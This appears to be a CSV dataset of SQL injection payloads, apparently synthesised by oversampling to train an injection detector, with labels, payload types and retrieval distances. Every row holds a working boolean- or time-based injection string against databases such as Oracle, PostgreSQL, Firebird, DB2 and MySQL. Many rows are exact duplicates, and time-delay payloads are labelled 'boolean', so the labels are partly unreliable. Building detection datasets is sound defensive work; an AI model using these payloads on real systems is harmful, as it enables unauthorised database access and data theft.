id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_001877,attack,boolean,"1  )   where 5333  =  5333 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000030,2.267909387240131
SMOTE_001878,attack,boolean,"1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000021,0.9740784976931797
SMOTE_001879,attack,boolean,"1""   )    )    and   (  1248  =  8705  )  *8705 and    (    (   ""wvma"" like ""wvma",nearest_attack_euclidean,R000017,1.3879213367642895
SMOTE_001880,attack,boolean,"1 where 3902  =  3902 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000005,0.24552335843068734
SMOTE_001881,attack,boolean,"1"" where 3018  =  3018 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",nearest_attack_euclidean,R000026,1.7913888189295417
SMOTE_001882,attack,boolean," and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,11 ...",nearest_attack_euclidean,R000003,1.805302176324884
SMOTE_001883,attack,boolean,"1""   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  ""fqap"" like ""fqap",nearest_attack_euclidean,R000023,2.22008103467237
SMOTE_001884,attack,boolean,"1%""  )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000007,0.35274833426449365
SMOTE_001885,attack,boolean,"1'   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000019,3.625394954866241
SMOTE_001886,attack,boolean,"1%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%""  =  """,nearest_attack_euclidean,R000016,2.9323752610606433
SMOTE_001887,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   ""vfvh""  =  ""vfvh",nearest_attack_euclidean,R000024,2.670905794898365
SMOTE_001888,attack,boolean,"1"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""kfps""  =  ""kfps",nearest_attack_euclidean,R000011,0.9287197008374548
SMOTE_001889,attack,boolean,"1""  )   where 7471  =  7471 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000020,1.4760490835084483
SMOTE_001890,attack,boolean,"1  )   where 5333  =  5333 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000030,1.4177417291812617
SMOTE_001891,attack,boolean,"1""  )   where 7471  =  7471 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000020,1.4750885548919954
SMOTE_001892,attack,boolean,"1""   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  ""fqap"" like ""fqap",nearest_attack_euclidean,R000023,0.19764862500007085
SMOTE_001893,attack,boolean,"1""   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  ""fqap"" like ""fqap",nearest_attack_euclidean,R000023,0.5710227462580704
SMOTE_001894,attack,boolean,"1""  )   where 7471  =  7471 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000020,1.200670165849366
SMOTE_001895,attack,boolean,"1"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""kfps""  =  ""kfps",nearest_attack_euclidean,R000011,1.104407481586079
SMOTE_001896,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000025,2.1776831905553897
SMOTE_001897,attack,boolean,"1'   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000019,1.227375324697552
SMOTE_001898,attack,boolean," and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,11 ...",nearest_attack_euclidean,R000003,1.2716728982053858
SMOTE_001899,attack,boolean,"1%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%""  =  """,nearest_attack_euclidean,R000016,1.0993685232509651
SMOTE_001900,attack,boolean,"1  )   where 5333  =  5333 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000030,0.1852771950165023
SMOTE_001901,attack,boolean,"1'   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000019,2.409176122639446
SMOTE_001902,attack,boolean,"1'||  (  select 'ersu' where 4123  =  4123 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000006,1.1574959537235925
SMOTE_001903,attack,boolean,"1' in boolean mode  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  #",nearest_attack_euclidean,R000008,0.2969117968376134
SMOTE_001904,attack,boolean,1'   )    )    rlike   (  select   (  case when   (  6205  =  1384  )   then 1 else 0x28 end   )    )    and    (    (   'ahjf'  =  'ahjf,nearest_attack_euclidean,R000031,3.400602214285139
SMOTE_001905,attack,boolean,"1"" where 3018  =  3018 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",nearest_attack_euclidean,R000026,3.5981553734028413
SMOTE_001906,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000025,2.9539056395382044
SMOTE_001907,attack,boolean,"1%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '",nearest_attack_euclidean,R000028,0.3396540743042742
SMOTE_001908,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   ""vfvh""  =  ""vfvh",nearest_attack_euclidean,R000024,1.2267487022570465
SMOTE_001909,attack,boolean,"1'||  (  select 'ersu' where 4123  =  4123 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000006,0.6265006823440984
SMOTE_001910,attack,boolean,"1""   )    )    as gawq where 4728  =  4728 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000010,1.0104492408970773
SMOTE_001911,attack,boolean,"1"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""kfps""  =  ""kfps",nearest_attack_euclidean,R000011,0.09612719437564761
SMOTE_001912,attack,boolean,"1'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   'kzgt'  =  'kzgt",nearest_attack_euclidean,R000004,0.11474715742715932
SMOTE_001913,attack,boolean,"1%""  )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000007,3.194294868132431
SMOTE_001914,attack,boolean,"1  )   where 5333  =  5333 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000030,0.029889259097606542
SMOTE_001915,attack,boolean,"1""  )   where 7471  =  7471 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000020,0.5532246033800783
SMOTE_001916,attack,boolean,"1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000021,1.094486280547665
SMOTE_001917,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and 'qjle'  =  'qjle",nearest_attack_euclidean,R000027,2.529218265865505
SMOTE_001918,attack,boolean,"1'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   'kzgt'  =  'kzgt",nearest_attack_euclidean,R000004,0.8480091274199704
SMOTE_001919,attack,boolean,"1'  )   where 4297  =  4297 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000018,1.583733568920609
SMOTE_001920,attack,boolean,"1  )   where 5333  =  5333 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000030,1.7882273834633844
SMOTE_001921,attack,boolean,"1""  )   where 7471  =  7471 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000020,1.3385788792839448
SMOTE_001922,attack,boolean,"1""  )   where 7471  =  7471 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000020,1.3556588801799054
SMOTE_001923,attack,boolean,"1'||  (  select 'ersu' where 4123  =  4123 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000006,1.6882037060493593
SMOTE_001924,attack,boolean,"1%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '",nearest_attack_euclidean,R000028,2.4121463547357487
SMOTE_001925,attack,boolean,"1'  )   and make_set  (  4551  =  6487,6487  )   and   (  'jnqa'  =  'jnqa",nearest_attack_euclidean,R000014,0.6336349641551429
SMOTE_001926,attack,boolean,"-9688%'   )    )     )   or elt  (  3695  =  7995,7995  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000013,3.585346198650918
SMOTE_001927,attack,boolean,"1'  )   and make_set  (  4551  =  6487,6487  )   and   (  'jnqa'  =  'jnqa",nearest_attack_euclidean,R000014,3.0504611203958665
SMOTE_001928,attack,boolean,"1%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%""  =  """,nearest_attack_euclidean,R000016,1.9829900206907611
SMOTE_001929,attack,boolean,"-9688%'   )    )     )   or elt  (  3695  =  7995,7995  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000013,3.4934111351323747
SMOTE_001930,attack,boolean,"1"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""kfps""  =  ""kfps",nearest_attack_euclidean,R000011,2.979445607227524
SMOTE_001931,attack,boolean,"1"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""kfps""  =  ""kfps",nearest_attack_euclidean,R000011,3.1916228825113664
SMOTE_001932,attack,boolean,"1""  )   where 7471  =  7471 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000020,1.544774955233224
SMOTE_001933,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000025,3.538419319263813
SMOTE_001934,attack,boolean,"1 where 3902  =  3902 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000005,0.2843611025490668
SMOTE_001935,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and ""%""  =  """,nearest_attack_euclidean,R000022,2.1278785371221187
SMOTE_001936,attack,boolean,"1""   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  ""fqap"" like ""fqap",nearest_attack_euclidean,R000023,0.9129728025353667
SMOTE_001937,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000025,2.5283983023012246
SMOTE_001938,attack,boolean,"1""   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  ""fqap"" like ""fqap",nearest_attack_euclidean,R000023,1.3922806764001947
SMOTE_001939,attack,boolean,"1""   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  ""fqap"" like ""fqap",nearest_attack_euclidean,R000023,1.7477717583256784
SMOTE_001940,attack,boolean,"1%""  )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000007,1.6118617995782292
SMOTE_001941,attack,boolean,"1"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""kfps""  =  ""kfps",nearest_attack_euclidean,R000011,1.0296845678754936
SMOTE_001942,attack,boolean,"1""   )    )    as gawq where 4728  =  4728 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000010,0.08865087569525934
SMOTE_001943,attack,boolean,"1  )   where 5333  =  5333 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000030,0.19195993263011604
SMOTE_001944,attack,boolean,"1'||  (  select 'ersu' where 4123  =  4123 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000006,0.9896347033484748
SMOTE_001945,attack,boolean,"1'||  (  select 'ersu' where 4123  =  4123 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000006,3.0349963156939137
SMOTE_001946,attack,boolean,"1'  )   where 4297  =  4297 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000018,0.7380239321061803
SMOTE_001947,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   ""vfvh""  =  ""vfvh",nearest_attack_euclidean,R000024,0.6239070745567719
SMOTE_001948,attack,boolean,"1%""  )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000007,0.346604328404936
SMOTE_001949,attack,boolean,"1"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""kfps""  =  ""kfps",nearest_attack_euclidean,R000011,0.29218272380174876
SMOTE_001950,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and 'qjle'  =  'qjle",nearest_attack_euclidean,R000027,1.9339502031750433
SMOTE_001951,attack,boolean,"1'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   'kzgt'  =  'kzgt",nearest_attack_euclidean,R000004,1.9859944599171193
SMOTE_001952,attack,boolean,"1'   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000019,0.5213073887761116
SMOTE_001953,attack,boolean,"1'   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000019,2.3718304703522093
SMOTE_001954,attack,boolean,"1' in boolean mode  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  #",nearest_attack_euclidean,R000008,2.1340932786760787
SMOTE_001955,attack,boolean,"1""   )    )    and   (  1248  =  8705  )  *8705 and    (    (   ""wvma"" like ""wvma",nearest_attack_euclidean,R000017,0.6202859888363402
SMOTE_001956,attack,boolean,"-9688%'   )    )     )   or elt  (  3695  =  7995,7995  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000013,2.1292208161780852
SMOTE_001957,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and   (  'qomf' like 'qomf",nearest_attack_euclidean,R000012,2.2823539292895543
SMOTE_001958,attack,boolean,"1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000021,1.5686060754353017
SMOTE_001959,attack,boolean,"1  )   where 5333  =  5333 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000030,0.7378570146966548
